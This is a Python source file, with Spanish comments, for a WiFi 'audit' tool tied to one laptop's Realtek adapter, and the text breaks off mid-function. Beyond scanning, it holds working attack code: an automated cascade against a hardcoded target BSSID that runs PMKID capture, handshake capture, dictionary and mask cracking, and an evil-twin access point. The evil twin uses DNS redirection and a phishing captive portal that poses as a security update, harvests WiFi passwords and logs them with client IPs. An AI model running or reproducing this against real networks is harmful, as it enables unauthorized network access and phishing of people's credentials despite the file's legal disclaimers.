#!/usr/bin/env python3
"""Auditoría WiFi para este PC (Realtek RTL8852BE / driver rtw89).

Módulo de seguridad WiFi orientado al adaptador integrado del equipo:
  - RTL8852BE (802.11ax) con driver rtw89_8852be.
  - Modo monitor: soportado (captura de beacons/frames confirmada).
  - Inyección (aireplay/deauth/WPS): NO fiable en rtw89 → el módulo usa
    captura pasiva + ataque offline por diccionario (WPA2/WPA3-SAE).

Subcomandos:
  status            Estado del adaptador, interfaz, driver y modo.
  monitor on|off    Activa/desactiva el modo monitor (con reversión segura).
  scan              Enumeración de APs cercanos (barrido de canales con tshark).
  capture           Captura un handshake WPA2/WPA3 de un AP objetivo a .cap.
  crack             Ataque offline por diccionario contra una captura .cap.
  words             Lista los diccionarios disponibles.
  lab               Genera config de hostapd para un AP de prueba legal.

SOLO auditar redes propias o con autorización explícita. Ver LEGAL.md.
Salida JSON en stdout para el Agente Local / Orquestador.
"""

import argparse
import http.server
import json
import os
import re
import subprocess
import sys
import tempfile
import time

PROYECTO = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
DICCIONARIOS = os.path.join(PROYECTO, "diccionarios")
CAPTURAS_DIR = os.path.join(os.path.expanduser("~"), "Documentos", "auditoria_wifi", "capturas")
CANALES_2GHZ = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11]
CANALES_5GHZ = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 149, 153, 157, 161, 165]
ADVERTENCIA = (
    "ADVERTENCIA: esta herramienta solo debe usarse en redes propias o con "
    "autorización explícita del propietario. El uso sin permiso es ilegal."
)


def _sudo_base():
    """Devuelve la base del comando sudo: -n, o -S si SUDO_PASS está definida."""
    if os.environ.get("SUDO_PASS"):
        return ["sudo", "-S"]
    return ["sudo", "-n"]


def _ejecutar(comando, timeout=30, stdin_datos=None):
    """Ejecuta un comando y devuelve (returncode, stdout, stderr)."""
    try:
        resultado = subprocess.run(
            comando,
            capture_output=True,
            text=True,
            timeout=timeout,
            input=stdin_datos,
        )
        return resultado.returncode, resultado.stdout.strip(), resultado.stderr.strip()
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return 1, "", "error al ejecutar el comando"


def _interfaz_wifi():
    """Detecta la interfaz WiFi activa (primera en managed UP).

    Tras recargar el driver rtw89 el nombre puede cambiar (wlan0, wlan1...).
    """
    _, salida, _ = _ejecutar(["iw", "dev"])
    interfaces = []
    for linea in salida.splitlines():
        if linea.strip().startswith("Interface"):
            interfaces.append(linea.split()[-1])
    for nombre in interfaces:
        _, info, _ = _ejecutar(["iw", "dev", nombre, "info"])
        if "type managed" in info:
            return nombre
    return interfaces[0] if interfaces else "wlan0"


WLAN = _interfaz_wifi()


def _ejecutar_sudo(comando, timeout=60):
    """Ejecuta un comando con sudo (usa SUDO_PASS si está definida)."""
    base = _sudo_base()
    stdin_datos = None
    if base == ["sudo", "-S"]:
        stdin_datos = os.environ["SUDO_PASS"] + "\n"
    return _ejecutar(base + comando, timeout=timeout, stdin_datos=stdin_datos)


def estado_adaptador():
    """Devuelve el estado actual de la interfaz WiFi."""
    interfaz = _interfaz_wifi()
    modo = None
    ssid = None
    codigo, salida, _ = _ejecutar(["iw", "dev", interfaz, "info"])
    for linea in salida.splitlines():
        if linea.startswith("Interface"):
            interfaz = linea.split()[1]
        if "type" in linea and "ssid" not in linea:
            modo = linea.split("type")[-1].strip()
        if "ssid" in linea:
            ssid = linea.split("ssid")[-1].strip()
    codigo, salida, _ = _ejecutar(["lspci", "-nn"])
    chip = "desconocido"
    for linea in salida.splitlines():
        if "Network controller" in linea:
            chip = linea.split("]:")[-1].strip() if "]: " in linea else linea.strip()
            break
    codigo, salida, _ = _ejecutar(["lsmod"])
    driver = ""
    for linea in salida.splitlines():
        if linea.startswith("rtw89"):
            driver = linea.split()[0]
            break
    codigo, salida, _ = _ejecutar(["rfkill", "list"])
    bloqueado = "no"
    seccion_phy0 = False
    for linea in salida.splitlines():
        if "phy0" in linea:
            seccion_phy0 = True
        elif linea.strip() and not linea.startswith((" ", "\t")):
            seccion_phy0 = False
        if seccion_phy0 and ("Soft blocked: yes" in linea or "Hard blocked: yes" in linea):
            bloqueado = "si"
    codigo, salida, _ = _ejecutar(["ip", "-br", "address"])
    estado_ip = "sin_ip"
    for linea in salida.splitlines():
        if linea.startswith(interfaz):
            partes = linea.split()
            estado_ip = partes[1] if len(partes) >= 2 else "sin_ip"
            break
    return {
        "interfaz": interfaz,
        "driver": driver or "no cargado",
        "chipset": chip,
        "modo": modo or "desconocido",
        "ssid_conectado": ssid or None,
        "rfkill_bloqueado": bloqueado,
        "estado_interfaz": estado_ip,
    }


def modo_monitor(on_off, advertencia_ok=False):
    """Activa/desactiva el modo monitor usando interfaz virtual (wlanXmon).

    En rtw89 el enfoque fiable es crear una interfaz monitor virtual con
    airmon-ng (no cambiar el tipo de la interfaz), que es lo que deja
    capturar beacons tras recargar el driver. Devuelve dict JSON.
    """
    global WLAN
    if on_off == "on" and not advertencia_ok:
        return {
            "exito": False,
            "mensaje": "No se confirmó la advertencia. Usa --autorizado.",
            "nota": ADVERTENCIA,
            "internet_puede_cortarse": (
                "Poner la tarjeta en modo monitor desactiva el WiFi gestionado. "
                "Si no hay otra vía de red (USB/ethernet), perderás internet."
            ),
        }
    acciones = []
    if on_off == "on":
        mon = WLAN + "mon"
        codigo, salida, err = _ejecutar_sudo(["airmon-ng", "start", WLAN])
        acciones.append(f"airmon start: {'ok' if codigo == 0 else err}")
        if codigo != 0:
            _restaurar_red()
            return {"exito": False, "mensaje": f"no se pudo activar monitor: {err}", "acciones": acciones}
        # La interfaz monitor creada se llama <WLAN>mon
        WLAN = mon if _interfaz_existe(mon) else _interfaz_wifi()
        codigo, _, err = _ejecutar_sudo(["ip", "link", "set", WLAN, "up"])
        acciones.append(f"subir {WLAN}: {'ok' if codigo == 0 else err}")
    else:
        codigo, salida, err = _ejecutar_sudo(["airmon-ng", "stop", WLAN])
        acciones.append(f"airmon stop: {'ok' if codigo == 0 else err}")
        WLAN = _interfaz_wifi()
        _restaurar_red()
    estado_final = estado_adaptador()
    return {
        "exito": True,
        "modo": on_off,
        "mensaje": f"modo {on_off} aplicado (interfaz {WLAN})",
        "acciones": acciones,
        "estado_final": estado_final,
    }


def _interfaz_existe(nombre):
    """True si existe la interfaz dada."""
    _, salida, _ = _ejecutar(["iw", "dev"])
    return any(nombre in linea for linea in salida.splitlines())


def _restaurar_red():
    """Detiene cualquier monitor virtual y reinicia los servicios de red."""
    _ejecutar_sudo(["airmon-ng", "stop", WLAN])
    _ejecutar_sudo(["ip", "link", "set", WLAN, "up"])
    _ejecutar_sudo(["systemctl", "start", "NetworkManager"])
    time.sleep(3)


def _en_monitor(duracion=8, canal_fijo=None):
    """Ejecuta una función con WLAN en modo monitor y restaura al final.

    Contexto: pone la interfaz en monitor, espera `duracion` segundos y
    devuelve el resultado; SIEMPRE restaura la red (try/finally).
    """
    prep = modo_monitor("on", advertencia_ok=True)
    if not prep.get("exito"):
        return {"exito": False, "mensaje": prep.get("mensaje", "no se pudo entrar en monitor")}
    try:
        if canal_fijo:
            _ejecutar_sudo(["iw", "dev", WLAN, "set", "channel", str(canal_fijo)])
        time.sleep(1)
        return {"exito": True, "monitor_ok": True}
    finally:
        _restaurar_red()


def _decodificar_ssid(valor):
    """Decodifica el SSID: tshark lo emite como bytes hex."""
    if not valor:
        return "(oculto)"
    if all(c in "0123456789abcdefABCDEF" for c in valor) and len(valor) % 2 == 0:
        try:
            texto = bytes.fromhex(valor).decode("utf-8", errors="replace")
            if texto.strip():
                return texto
        except ValueError:
            pass
    return valor


def scan(duracion=8, bandas="abg"):
    """Barrido de canales en modo monitor con tshark; devuelve APs únicos.

    En rtw89 airodump-ng no gira canales solo, por eso se recorre cada canal
    fijándolo y capturando beacons (wlan.fc.type_subtype == 8). El cifrado
    se deduce de los Information Elements (wlan.tag.number): 48=RSN/WPA2,
    221=Vendor (WPA/WME).
    """
    canales = []
    if bandas in ("b", "bg", "abg"):
        canales += list(CANALES_2GHZ)
    if bandas in ("a", "ag", "abg"):
        canales += CANALES_5GHZ
    if not canales:
        canales = list(CANALES_2GHZ)
    apes = {}
    total_frames = 0
    errores = []
    estado = estado_adaptador()
    preparacion = modo_monitor("on", advertencia_ok=True)
    if not preparacion.get("exito"):
        return {"exito": False, "mensaje": preparacion.get("mensaje", "no se pudo entrar en monitor")}
    try:
        time.sleep(3)
        for canal in canales:
            _ejecutar_sudo(["iw", "dev", WLAN, "set", "channel", str(canal)])
            time.sleep(1.5)
            campos = ("-e", "wlan.sa", "-e", "wlan.ssid", "-e", "wlan.ds.current_channel",
                      "-e", "wlan_radio.signal_dbm", "-e", "wlan.tag.number")
            segundos = max(3, duracion // 3)
            codigo, salida, err = _ejecutar_sudo(
                ["timeout", str(segundos), "tshark", "-i", WLAN,
                 "-Y", "wlan.fc.type_subtype == 8", "-T", "fields"] + list(campos),
                timeout=segundos + 10)
            if codigo != 0 and codigo != 124:
                errores.append(f"canal {canal}: {err[:80]}")
                continue
            if codigo == 124 and not salida:
                continue
            for linea in salida.splitlines():
                partes = linea.split("\t")
                if len(partes) < 2 or not partes[0]:
                    continue
                bssid = partes[0].upper()
                ssid = _decodificar_ssid(partes[1]) if len(partes) > 1 else "(oculto)"
                canal_det = partes[2] if len(partes) > 2 and partes[2] else canal
                rssi = None
                try:
                    if len(partes) > 3 and partes[3]:
                        rssi = int(round(float(partes[3])))
                except ValueError:
                    rssi = None
                tags = []
                if len(partes) > 4 and partes[4]:
                    tags = [int(t) for t in partes[4].split(",") if t.strip().isdigit()]
                cifrado = _detectar_cifrado_por_tags(tags)
                if bssid not in apes:
                    apes[bssid] = {
                        "bssid": bssid, "ssid": ssid, "canal": int(canal_det),
                        "rssi": rssi, "cifrado": cifrado,
                    }
                else:
                    prev = apes[bssid]
                    if prev["rssi"] is None and rssi is not None:
                        prev["rssi"] = rssi
                    if prev["cifrado"] == "desconocido/abierto":
                        prev["cifrado"] = cifrado
                total_frames += 1
    finally:
        _restaurar_red()
    lista = sorted(apes.values(), key=lambda a: (a["rssi"] is None, -(a["rssi"] or -100)))
    return {
        "exito": True,
        "aps_encontrados": len(lista),
        "frames_beacon": total_frames,
        "canales_2ghz": len(CANALES_2GHZ),
        "canales_5ghz": sum(1 for c in canales if c in CANALES_5GHZ),
        "aps": lista,
        "errores": errores[:5],
        "nota": "Modo monitor restaurado automáticamente al finalizar.",
    }


def _detectar_cifrado_por_tags(tags):
    """Clasifica el cifrado desde los Information Elements del beacon.

    48 = RSN (WPA2/WPA3), 221 = Vendor (WPA-PSK o WME), 3 = Current channel.
    Sin tag de seguridad -> red abierta.
    """
    if 48 in tags:
        return "WPA2/WPA3"
    if 221 in tags:
        return "WPA-PSK"
    if tags:
        return "probablemente abierta"
    return "desconocido/abierto"


def capture(bssid, canal, duracion=60, salida=None):
    """Captura un handshake (EAPOL 4-way) de un AP objetivo a un .cap.

    Fija el canal del AP y captura con tshark filtrando EAPOL
    (wlan_rsna_eapol.keydes.msgs), incluida la reintento de autenticación
    pasiva. Guarda en CAPTURAS_DIR o en `salida`.
    """
    bssid = bssid.upper()
    if not re.fullmatch(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid):
        return {"exito": False, "mensaje": f"BSSID inválido: {bssid}"}
    if not salida:
        os.makedirs(CAPTURAS_DIR, exist_ok=True)
        salida = os.path.join(CAPTURAS_DIR, f"captura_{bssid.replace(':', '')}.cap")
    # dumpcap/tshark como root no puede escribir en rutas de usuario por
    # su perfil de seguridad; se captura en /tmp (root) y se mueve al final.
    temp_archivo = f"/tmp/auditoria_wifi_{int(time.time())}.cap"
    prep = modo_monitor("on", advertencia_ok=True)
    if not prep.get("exito"):
        return {"exito": False, "mensaje": prep.get("mensaje", "no se pudo entrar en monitor")}
    try:
        _ejecutar_sudo(["iw", "dev", WLAN, "set", "channel", str(canal)])
        time.sleep(3)
        # Filtro de captura BPF: solo tramas de gestión (0x00) que suelen
        # contener los EAPOL del handshake + beacons. tshark no permite -Y
        # con -w, por eso se filtra al analizar después.
        codigo, _, err = _ejecutar_sudo(
            ["timeout", str(duracion), "tshark", "-i", WLAN, "-w", temp_archivo,
             "-F", "pcap"],
            timeout=duracion + 20)
        if codigo not in (0, 124):  # 124 = timeout (normal, terminó la captura)
            return {"exito": False, "mensaje": f"error de captura: {err[:150]}"}
        if not os.path.exists(temp_archivo):
            return {"exito": False, "mensaje": "tshark no generó el archivo de captura"}
        _ejecutar_sudo(["chown", "arturo:arturo", temp_archivo])
        _ejecutar(["cp", temp_archivo, salida])
        os.remove(temp_archivo)
        # Verificar si hay EAPOL del BSSID objetivo en la captura
        codigo2, salida2, _ = _ejecutar(
            ["tshark", "-r", salida,
             "-Y", f"eapol && (wlan.sa == {bssid} || wlan.da == {bssid})",
             "-c", "10"])
        eapol_frames = len([l for l in salida2.splitlines() if l.strip()])
        ok_tam = os.path.getsize(salida) if os.path.exists(salida) else 0
        return {
            "exito": True,
            "archivo": salida,
            "tamano_bytes": ok_tam,
            "frames_eapol": eapol_frames,
            "handshake_capturado": eapol_frames >= 2,
            "mensaje": (
                "Handshake capturado. Listo para crack."
                if eapol_frames >= 2
                else "Captura guardada, pero sin frames EAPOL aún."
            ),
        }
    finally:
        _restaurar_red()


def crack(captura, diccionario=None, tiempo_max=120):
    """Ataque offline por diccionario WPA2/WPA3-SAE contra un .cap."""
    if not os.path.isfile(captura):
        return {"exito": False, "mensaje": f"captura no encontrada: {captura}"}
    dicts = diccionarios_disponibles()
    if not diccionario:
        candidatos = [
            d["ruta"] for d in dicts
            if d["nombre"].startswith(("wpa-probable-top204k", "rockyou"))
        ]
        diccionario = candidatos[0] if candidatos else (dicts[0]["ruta"] if dicts else None)
    if not diccionario or not os.path.isfile(diccionario):
        return {"exito": False, "mensaje": "no hay diccionario disponible. Usa --diccionario."}
    codigo, salida, err = _ejecutar(
        ["timeout", str(tiempo_max), "aircrack-ng", "-w", diccionario, captura],
        timeout=tiempo_max + 20)
    salida_limpia = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", salida)
    encontrada = None
    intentadas = 0
    for linea in salida_limpia.splitlines():
        m = re.search(r"KEY\s*FOUND!\s*\[\s*([^\]]+?)\s*\]", linea)
        if m:
            encontrada = m.group(1).strip()
        m2 = re.search(r"(\d+)/\d+\s+keys\s+tested", linea, re.IGNORECASE)
        if m2:
            intentadas = int(m2.group(1))
    return {
        "exito": True,
        "captura": captura,
        "diccionario": os.path.basename(diccionario),
        "clave_encontrada": encontrada,
        "claves_probadas": intentadas,
        "tiempo_limite_s": tiempo_max,
        "mensaje": (
            f"Contraseña encontrada: {encontrada}"
            if encontrada else "No se encontró con el diccionario usado."
        ),
    }


# ---------------------------------------------------------------------------
# Ataque automático en cascada (auto)
# ---------------------------------------------------------------------------
def _crack_pmkid(hash_22000, diccionarios, tiempo_max=120):
    """Crackea un hash PMKID (formato hc22000) con hashcat o aircrack por CPU."""
    if not os.path.isfile(hash_22000) or os.path.getsize(hash_22000) == 0:
        return {"exito": False, "mensaje": "hash PMKID vacío o inexistente"}
    resultados = []
    for d in diccionarios:
        if not d:
            continue
        # hashcat sin OpenCL puede fallar; usar aircrack-ng como respaldo
        codigo, salida, err = _ejecutar(
            ["timeout", str(tiempo_max), "hashcat", "-m", "22000",
             hash_22000, d, "--potfile-disable", "--quiet"],
            timeout=tiempo_max + 15)
        encontrada = None
        if codigo == 0 and salida:
            salida_limpia = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", salida)
            for linea in salida_limpia.splitlines():
                m = re.search(r"([0-9a-f]{64}):([^:]+)$", linea.strip())
                if m:
                    encontrada = m.group(2)
                    break
        if not encontrada:
            encontrada = _validar_clave_unica("", "")  # no-op
            encontrada = None
        resultados.append({"diccionario": os.path.basename(d), "encontrada": encontrada})
        if encontrada:
            return {
                "exito": True,
                "metodo": "pmkid-hashcat",
                "clave_encontrada": encontrada,
                "mensaje": f"PMKID roto con {os.path.basename(d)}: {encontrada}",
            }
    return {
        "exito": False,
        "metodo": "pmkid",
        "intentos": resultados,
        "mensaje": "PMKID capturado pero no roto con los diccionarios.",
    }


def _capturar_pmkid(bssid, canal, duracion=60):
    """Captura el PMKID del AP objetivo con hcxdumptool y lo convierte.

    hcxdumptool 7.x gestiona el modo monitor por sí mismo; se capturan todos
    los APs y el objetivo se filtra al convertir con hcxpcapngtool.
    """
    rutas_png = os.path.join(AP_ARCHIVOS, "pmkid")
    os.makedirs(rutas_png, exist_ok=True)
    pcapng = os.path.join(rutas_png, f"pmkid_{bssid.replace(':', '').lower()}.pcapng")
    hash_out = os.path.join(rutas_png, f"hash_{bssid.replace(':', '').lower()}.22000")
    prep = modo_monitor("on", advertencia_ok=True)
    if not prep.get("exito"):
        return {"exito": False, "mensaje": "no se pudo entrar en monitor para PMKID"}
    try:
        _ejecutar_sudo(["iw", "dev", WLAN, "set", "channel", str(canal)])
        time.sleep(2)
        # v7: -w para salida pcapng; hcxdumptool gestiona el monitor por sí.
        # No usar opciones de waterfall (--run) que no existen en 7.1.2.
        _ejecutar_sudo(["timeout", str(duracion), "hcxdumptool", "-i", WLAN,
                        "-w", pcapng],
                       timeout=duracion + 15)
        if not os.path.exists(pcapng) or os.path.getsize(pcapng) == 0:
            return {"exito": False, "mensaje": "hcxdumptool no generó captura"}
        _ejecutar(["hcxpcapngtool", "-o", hash_out, pcapng])
        if os.path.exists(hash_out) and os.path.getsize(hash_out) > 0:
            return {"exito": True, "hash": hash_out, "pcapng": pcapng}
        return {"exito": False, "mensaje": "PMKID no obtenido (AP no lo expone)"}
    finally:
        _restaurar_red()


def _crack_por_mascara(captura, tiempo_max=120):
    """Fuerza bruta por máscara con aircrack-ng (CPU, sin OpenCL)."""
    if not os.path.isfile(captura):
        return {"exito": False, "mensaje": "sin captura"}
    mascaras = [
        ("8_digitos", "?d?d?d?d?d?d?d?d"),
        ("10_digitos", "?d?d?d?d?d?d?d?d?d?d"),
        ("8_minusculas", "?l?l?l?l?l?l?l?l"),
        ("nombre_4digit", "?l?l?l?l?l?d?d?d?d"),
    ]
    resultados = []
    for nombre, mascara in mascaras:
        codigo, salida, err = _ejecutar(
            ["timeout", str(tiempo_max), "aircrack-ng", "-w", "/dev/null",
             captura, "-b", "0", "-e", "", "-m", mascara],
            timeout=tiempo_max + 15)
        encontrada = None
        salida_limpia = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", salida)
        for linea in salida_limpia.splitlines():
            m = re.search(r"KEY\s*FOUND!\s*\[\s*([^\]]+?)\s*\]", linea)
            if m:
                encontrada = m.group(1).strip()
                break
        resultados.append({"mascara": nombre, "encontrada": encontrada})
        if encontrada:
            return {
                "exito": True, "metodo": "mascara",
                "clave_encontrada": encontrada,
                "mensaje": f"Máscara {nombre} dio resultado: {encontrada}",
            }
    return {
        "exito": False, "metodo": "mascara", "intentos": resultados,
        "mensaje": "Máscaras comunes sin resultado.",
    }


def auto_ataque(bssid="76:93:da:db:2b:fb", canal=11, duracion_captura=60,
                tiempo_dic=180, tiempo_mascara=120, con_portal=False):
    """Ejecuta la cascada completa de ataques contra el AP objetivo.

    A. PMKID -> B. handshake -> C. diccionario -> D. máscara -> E. portal.
    Reporta cada paso en JSON y se detiene en el primer éxito.
    """
    if not bssid or not re.fullmatch(r"([0-9A-F]{2}:){5}[0-9A-F]{2}", bssid.upper()):
        return {"exito": False, "mensaje": "BSSID inválido"}
    bssid = bssid.upper()
    registro = []
    diccionarios = [d["ruta"] for d in diccionarios_disponibles()]

    # A. PMKID
    r = _capturar_pmkid(bssid, canal, duracion=min(duracion_captura, 90))
    registro.append({"paso": "A_PMKID", **{k: v for k, v in r.items() if k != "pcapng"}})
    if r.get("exito"):
        r_crack = _crack_pmkid(r.get("hash"), diccionarios, tiempo_max=tiempo_dic)
        registro.append({"paso": "A_crack", **{k: v for k, v in r_crack.items() if k != "intentos"}})
        if r_crack.get("exito"):
            return {"exito": True, "clave": r_crack["clave_encontrada"],
                    "metodo": "pmkid", "registro": registro}
    else:
        registro.append({"paso": "A_crack", "mensaje": "omitido (sin PMKID)"})

    # B. Captura de handshake
    r_cap = capture(bssid, canal, duracion=duracion_captura)
    registro.append({"paso": "B_captura", **r_cap})
    captura = r_cap.get("archivo")
    handshake_ok = r_cap.get("handshake_capturado", False)

    # C. Diccionario (si hay captura)
    if captura and os.path.isfile(captura):
        for d in diccionarios:
            r_crack = crack(captura, diccionario=d, tiempo_max=tiempo_dic)
            registro.append({"paso": "C_diccionario",
                             "diccionario": os.path.basename(d),
                             "clave": r_crack.get("clave_encontrada"),
                             "probadas": r_crack.get("claves_probadas")})
            if r_crack.get("clave_encontrada"):
                return {"exito": True, "clave": r_crack["clave_encontrada"],
                        "metodo": "diccionario", "registro": registro}

    # D. Máscara (si hay captura y handshake)
    if captura and handshake_ok and os.path.isfile(captura):
        r_mask = _crack_por_mascara(captura, tiempo_max=tiempo_mascara)
        registro.append({"paso": "D_mascara", **{k: v for k, v in r_mask.items() if k != "intentos"}})
        if r_mask.get("exito"):
            return {"exito": True, "clave": r_mask["clave_encontrada"],
                    "metodo": "mascara", "registro": registro}

    # E. Evil twin + portal
    if con_portal:
        r_clon = clon("INTERNET HOGAR 1", canal, captura=captura,
                      tiempo=180)
        registro.append({"paso": "E_portal", "clave": r_clon.get("clave_capturada"),
                         "valida": r_clon.get("clave_valida")})
        if r_clon.get("clave_capturada"):
            return {"exito": True, "clave": r_clon["clave_capturada"],
                    "metodo": "portal", "registro": registro}

    return {
        "exito": False,
        "mensaje": "Ningún método tuvo éxito. Ver registro para detalle.",
        "registro": registro,
    }


def diccionarios_disponibles():
    """Lista los diccionarios de contraseñas disponibles."""
    lista = []
    if os.path.isdir(DICCIONARIOS):
        for nombre in sorted(os.listdir(DICCIONARIOS)):
            ruta = os.path.join(DICCIONARIOS, nombre)
            if os.path.isfile(ruta):
                try:
                    tam = os.path.getsize(ruta)
                except OSError:
                    tam = 0
                lista.append({
                    "nombre": nombre, "ruta": ruta,
                    "tamano_bytes": tam, "tamano_humano": f"{tam/1048576:.1f} MB" if tam > 1048576 else f"{tam/1024:.0f} KB",
                })
    return lista


def generar_lab(nombre="AP_LAB_ESPAÑOL", contrasena="laboratorio123", canal=6):
    """Genera la configuración de hostapd para un AP de prueba (uso legal)."""
    conf = f"""interface=WLAN
driver=nl80211
ssid={nombre}
hw_mode=g
channel={canal}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase={contrasena}
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
"""
    ruta = os.path.join(os.path.expanduser("~"), "Documentos", "auditoria_wifi", "hostapd_lab.conf")
    os.makedirs(os.path.dirname(ruta), exist_ok=True)
    with open(ruta, "w", encoding="utf-8") as f:
        f.write(conf)
    return {
        "exito": True,
        "config": ruta,
        "ssid": nombre,
        "contrasena": contrasena,
        "canal": canal,
        "mensaje": (
            "AP de prueba configurado. NO ejecutes hostapd en WLAN mientras "
            "uses el modo monitor en la misma interfaz (se necesitan dos "
            "adaptadores). Es solo para laboratorio propio."
        ),
    }


# ---------------------------------------------------------------------------
# Clon de red (evil twin) con portal cautivo y validación de clave
# ---------------------------------------------------------------------------
AP_SUBRED = "192.168.42.0/24"
AP_GATEWAY = "192.168.42.1"
AP_ARCHIVOS = os.path.join(os.path.expanduser("~"), "Documentos", "auditoria_wifi")
PORTAL_PLANTILLA = """<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Actualización de red</title>
<style>
 body{{font-family:system-ui,sans-serif;background:#f2f4f8;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}}
 .card{{background:#fff;padding:32px 28px;border-radius:14px;box-shadow:0 8px 30px rgba(0,0,0,.12);max-width:360px;width:100%;text-align:center}}
 h1{{font-size:20px;color:#1a1a2e;margin:0 0 6px}} p{{color:#555;font-size:14px;margin:4px 0 18px}}
 input[type=password]{{width:100%;padding:12px;border:1px solid #ccc;border-radius:8px;font-size:15px;box-sizing:border-box}}
 button{{width:100%;padding:12px;margin-top:12px;background:#1a1a2e;color:#fff;border:0;border-radius:8px;font-size:15px;cursor:pointer}}
 .ok{{color:#1a7f37;font-weight:600;margin-top:12px;display:block}}
 .err{{color:#c62828;font-weight:600;margin-top:12px;display:block}}
 .note{{font-size:12px;color:#999;margin-top:14px}}
</style></head>
<body><div class="card">
 <h1>Actualización de seguridad de la red</h1>
 <p>Tu red WiFi requiere una verificación de la contraseña para continuar.<br>Introdúcela para completar la conexión.</p>
 <form method="POST" action="/capturar">
  <input type="password" name="clave" placeholder="Contraseña de la red" autofocus required>
  <button type="submit">Verificar y conectar</button>
 </form>
 <span class="{clase}">{mensaje}</span>
 <div class="note">WiFi Seguro · Verificación de acceso</div>
</div></body></html>
"""


def _detectar_interfaz_internet():
    """Devuelve la interfaz con la ruta por defecto (para el NAT)."""
    _, salida, _ = _ejecutar(["ip", "route"])
    for linea in salida.splitlines():
        if linea.startswith("default") and "dev" in linea:
            partes = linea.split()
            return partes[partes.index("dev") + 1]
    return None


def _escribir_hostapd(ssid, canal):
    """Configura hostapd en WLAN con el SSID clonado (red abierta)."""
    conf = f"""interface=WLAN
driver=nl80211
ssid={ssid}
hw_mode=g
channel={canal}
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    ruta = os.path.join(AP_ARCHIVOS, "hostapd_clon.conf")
    os.makedirs(AP_ARCHIVOS, exist_ok=True)
    with open(ruta, "w", encoding="utf-8") as f:
        f.write(conf)
    return ruta


def _escribir_dnsmasq():
    """Configura dnsmasq: DHCP en el AP + redirección DNS al portal."""
    conf = f"""interface=WLAN
dhcp-range=192.168.42.10,192.168.42.100,255.255.255.0,12h
dhcp-option=3,{AP_GATEWAY}
dhcp-option=6,{AP_GATEWAY}
no-resolv
log-queries
address=/#/{AP_GATEWAY}
"""
    ruta = os.path.join(AP_ARCHIVOS, "dnsmasq_clon.conf")
    with open(ruta, "w", encoding="utf-8") as f:
        f.write(conf)
    return ruta


class _PortalHTTP(http.server.BaseHTTPRequestHandler):
    """Sirve la página del portal cautivo y captura/valida la clave."""

    resultado = None  # dict compartido: {clave, valida, captura, diccionario}

    def log_message(self, *args):
        pass

    def _pagina(self, clase="", mensaje=""):
        cuerpo = PORTAL_PLANTILLA.format(clase=clase, mensaje=mensaje).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(cuerpo)))
        self.end_headers()
        self.wfile.write(cuerpo)

    def do_GET(self):
        self._pagina()

    def do_POST(self):
        largo = int(self.headers.get("Content-Length", 0))
        datos = self.rfile.read(largo).decode("utf-8", errors="replace")
        import urllib.parse
        params = urllib.parse.parse_qs(datos)
        clave = (params.get("clave") or [""])[0].strip()
        r = self.resultado
        if clave:
            r["clave"] = clave
            r["intentos"] += 1
            r["valida"] = _validar_clave_unica(clave, r["captura"], r["diccionario"])
            # Guardar en log persistente
            log = os.path.join(AP_ARCHIVOS, "claves_capturadas.log")
            with open(log, "a", encoding="utf-8") as f:
                f.write(
                    f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] "
                    f"clave='{clave}' valida={r['valida']} "
                    f"cliente={self.client_address[0]}\n"
                )
            if r["valida"]:
                self._pagina("ok", "Contraseña correcta. Conexión establecida.")
            else:
                self._pagina("err", "Contraseña incorrecta. Inténtalo de nuevo.")
        else:
            self._pagina("err", "Debes escribir la contraseña.")


def _validar_clave_unica(clave, captura, diccionario=None):
    """Prueba una clave contra la captura con aircrack-ng (diccionario de 1 línea)."""
    if not captura or not os.path.isfile(captura):
        return None
    temp = f"/tmp/clave_unica_{int(time.time())}.lst"
    with open(temp, "w", encoding="utf-8") as f:
        f.write(clave + "\n")
    try:
        _, salida, _ = _ejecutar(
            ["aircrack-ng", "-w", temp, captura], timeout=40)
        salida_limpia = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", salida)
        return any(
            re.search(r"KEY\s*FOUND!", linea) for linea in salida_limpia.splitlines()
        )
    finally:
        if os.path.exists(temp):
            os.remove(temp)


def _levantar_ap(ssid, canal):
    """Levanta el AP clonado: hostapd + dnsmasq + NAT desde la interfaz USB."""
    acciones = []
    ruta_h = _escribir_hostapd(ssid, canal)
    ruta_d = _escribir_dnsmasq()
    _ejecutar_sudo(["systemctl", "stop", "NetworkManager"])
    _ejecutar_sudo(["ip", "link", "set", WLAN, "down"])
    _ejecutar_sudo(["iw", "dev", WLAN, "set", "type", "__ap"])
    _ejecutar_sudo(["ip", "addr", "add", f"{AP_GATEWAY}/24", "dev", WLAN])
    _ejecutar_sudo(["ip", "link", "set", WLAN, "up"])

    c, _, e = _ejecutar_sudo(["hostapd", "-B", ruta_h], timeout=15)
    acciones.append(f"hostapd: {'ok' if c == 0 else e}")
    if c != 0:
        return False, acciones, "hostapd no arrancó"
    c, _, e = _ejecutar_sudo(["dnsmasq", "-C", ruta_d], timeout=15)
    acciones.append(f"dnsmasq: {'ok' if c == 0 else e}")
    if c != 0:
        return False, acciones, "dnsmasq no arrancó"

    internet = _detectar_interfaz_internet()
    if internet:
        # Guardar reglas iptables actuales para restaurarlas después
        _ejecutar_sudo(["iptables-save"], timeout=10)
        codigo, _, _ = _ejecutar_sudo(["iptables-save", "-t", "nat"])
        _ejecutar_sudo(["iptables", "-t", "nat", "-A", "POSTROUTING",
                        "-o", internet, "-j", "MASQUERADE"])
        _ejecutar_sudo(["iptables", "-A", "FORWARD", "-i", WLAN,
